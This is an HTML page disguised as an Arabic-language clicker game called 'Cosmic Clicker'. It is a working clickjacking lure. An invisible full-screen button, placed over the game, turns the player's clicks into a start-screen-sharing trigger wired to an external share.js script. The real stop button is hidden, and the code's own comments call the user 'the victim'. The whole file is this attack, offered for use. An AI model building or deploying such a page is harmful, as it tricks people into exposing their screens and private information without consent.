<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="referrer" content="no-referrer">
    <title>CONNECT HUB | Cosmic Clicker</title>
    <style>
        /* --- GAME STYLES --- */
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0f172a, #1e293b);
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            user-select: none;
        }

        .game-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.05);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
            max-width: 90%;
            width: 400px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #38bdf8;
            text-shadow: 0 0 10px rgba(56, 189, 248, 0.5);
        }

        .score-board {
            font-size: 48px;
            font-weight: bold;
            margin: 20px 0;
            color: #fbbf24;
            text-shadow: 0 0 20px rgba(251, 191, 36, 0.4);
        }

        .score-label {
            font-size: 16px;
            color: #94a3b8;
            margin-bottom: 20px;
        }

        .click-area {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        /* Fake button */
        .fake-button {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: radial-gradient(circle, #10b981, #047857);
            border: 4px solid #34d399;
            box-shadow: 0 0 20px rgba(16, 185, 129, 0.6);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            cursor: pointer;
            transition: transform 0.1s;
        }

        .fake-button:active {
            transform: scale(0.95);
        }

        .instructions {
            font-size: 14px;
            color: #cbd5e1;
            margin-top: 20px;
        }

        /* --- INVISIBLE TRIGGER (The real screen share button) --- */
        #start {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            opacity: 0 !important;       /* Completely transparent */
            z-index: 9999999 !important; /* On top of the game */
            cursor: default !important;  /* Keep normal cursor so it feels like a game */
            border: none !important;
            background: transparent !important;
            outline: none !important;
            display: block !important;
            /* Prevent text selection */
            user-select: none !important;
            -webkit-tap-highlight-color: transparent !important;
        }

        /* Hide the real stop button */
        #stop {
            display: none !important;
        }
    </style>
</head>
<body>

    <!-- GAME INTERFACE (Visible to the victim) -->
    <div class="game-container">
        <h1>COSMIC CLICKER</h1>
        <div class="score-label">النقاط الحالية</div>
        <div class="score-board" id="score">0</div>
        
        <div class="click-area">
            <div class="fake-button" id="fakeBtn">🌌</div>
        </div>
        
        <div class="instructions">
            اضغط على الكوكب لجمع النقاط!<br>
            (اضغط بأسرع ما يمكن لتصل للقمة)
        </div>
    </div>

    <!-- HIDDEN ELEMENTS -->
    <!-- This is the real button that triggers the screen share prompt -->
    <button id="start">بدء مشاركة الشاشة</button>
    <button id="stop" class="hidden">إيقاف المشاركة</button>
    
    <!-- Dummy elements to prevent errors in the original share.js -->
    <div id="share" style="display:none;"></div>
    <div id="compat" style="display:none;"></div>
    <p id="msg" style="display:none;"></p>
    <div class="video" style="display:none;">
        <video id="preview" autoplay playsinline muted></video>
        <div id="placeholder"></div>
    </div>

    <script>
        // --- GAME LOGIC (Makes it look real) ---
        let score = 0;
        const scoreElement = document.getElementById('score');
        const fakeBtn = document.getElementById('fakeBtn');

        // Listen for clicks globally to update score visually
        document.addEventListener('click', function() {
            score += Math.floor(Math.random() * 5) + 1; // Add random points
            scoreElement.innerText = score;
            
            // Add a quick animation pop effect
            fakeBtn.style.transform = 'scale(1.1)';
            setTimeout(() => {
                fakeBtn.style.transform = 'scale(1)';
            }, 100);
        });
    </script>

    <!-- The original share script -->
    <script src="/static/share.js"></script>
</body>
</html>
